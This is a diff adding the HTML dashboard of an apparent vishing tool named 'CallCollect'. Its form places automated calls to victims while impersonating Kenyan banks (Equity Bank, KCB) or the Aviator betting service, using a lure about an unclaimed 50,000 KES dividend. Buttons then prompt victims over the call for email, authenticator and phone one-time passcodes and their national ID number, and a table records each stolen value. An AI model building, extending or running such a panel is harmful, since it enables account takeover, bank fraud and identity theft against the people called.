@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Collection System</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+</head>
+<body>
+    <div class="dashboard">
+        <div class="sidebar">
+            <div class="logo">
+                <i class="fas fa-phone-alt"></i>
+                <span>CallCollect</span>
+            </div>
+            <div class="nav-menu">
+                <div class="nav-item active">
+                    <i class="fas fa-tachometer-alt"></i>
+                    <span>Dashboard</span>
+                </div>
+                <div class="nav-item">
+                    <i class="fas fa-address-book"></i>
+                    <span>Contacts</span>
+                </div>
+                <div class="nav-item">
+                    <i class="fas fa-chart-line"></i>
+                    <span>Reports</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <div class="top-bar">
+                <h1>Call Collection System</h1>
+                <div class="status-indicator">
+                    <i class="fas fa-circle"></i>
+                    <span>System Online</span>
+                </div>
+            </div>
+            
+            <div class="content-grid">
+                <div class="card initiate-card">
+                    <div class="card-header">
+                        <i class="fas fa-plus-circle"></i>
+                        <h2>Initiate New Call</h2>
+                    </div>
+                    <form id="callForm">
+                        <div class="form-group">
+                            <label><i class="fas fa-phone"></i> Phone Number</label>
+                            <input type="tel" id="phoneNumber" placeholder="+254796182560" required>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-user"></i> Full Name (Optional)</label>
+                            <input type="text" id="fullName" placeholder="John Doe">
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-building"></i> Subject</label>
+                            <select id="subject">
+                                <option value="">Select Subject</option>
+                                <option value="Equity Bank">Equity Bank</option>
+                                <option value="KCB">KCB</option>
+                                <option value="Aviator">Aviator</option>
+                                <option value="Custom">Custom</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-comment"></i> Custom Intro Message</label>
+                            <textarea id="customIntro" rows="3" placeholder="We are calling about your unclaimed dividend of 50,000 KES..."></textarea>
+                        </div>
+                        <button type="submit" class="btn-primary">
+                            <i class="fas fa-phone-alt"></i> Initiate Call
+                        </button>
+                    </form>
+                </div>
+                
+                <div class="card active-call-card">
+                    <div class="card-header">
+                        <i class="fas fa-phone-volume"></i>
+                        <h2>Active Call Controls</h2>
+                    </div>
+                    <div id="activeCallInfo" class="active-call-info">
+                        <div class="no-active">No active call selected</div>
+                    </div>
+                    <div class="button-grid" id="actionButtons" style="display: none;">
+                        <button class="action-btn email-otp" data-action="email_otp">
+                            <i class="fas fa-envelope"></i>
+                            <span>Request Email OTP</span>
+                        </button>
+                        <button class="action-btn auth-otp" data-action="auth_otp">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>Request Auth OTP</span>
+                        </button>
+                        <button class="action-btn phone-otp" data-action="phone_otp">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span>Request Phone OTP</span>
+                        </button>
+                        <button class="action-btn id-number" data-action="id_number">
+                            <i class="fas fa-id-card"></i>
+                            <span>Request ID Number</span>
+                        </button>
+                    </div>
+                    <div class="custom-voice-section" id="customVoiceSection" style="display: none;">
+                        <div class="divider">
+                            <span>Custom Voice Command</span>
+                        </div>
+                        <div class="custom-voice-input">
+                            <input type="text" id="customVoiceMessage" placeholder="Tap Yes and 89 to continue...">
+                            <button id="sendCustomVoice" class="btn-secondary">
+                                <i class="fas fa-bullhorn"></i> Send
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card contacts-card">
+                    <div class="card-header">
+                        <i class="fas fa-address-book"></i>
+                        <h2>Recent Contacts</h2>
+                    </div>
+                    <div class="table-container">
+                        <table id="contactsTable">
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Phone</th>
+                                    <th>Email OTP</th>
+                                    <th>Auth OTP</th>
+                                    <th>Phone OTP</th>
+                                    <th>ID Number</th>
+                                    <th>Status</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr class="loading">
+                                    <td colspan="7">Loading contacts...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                
+                <div class="card logs-card">
+                    <div class="card-header">
+                        <i class="fas fa-history"></i>
+                        <h2>Live Activity Log</h2>
+                        <button id="clearLogs" class="icon-btn">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </div>
+                    <div id="logsContainer" class="logs-container">
+                        <div class="log-entry info">System ready. Waiting for activity...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="dashboard.js"></script>
+</body>
+</html>
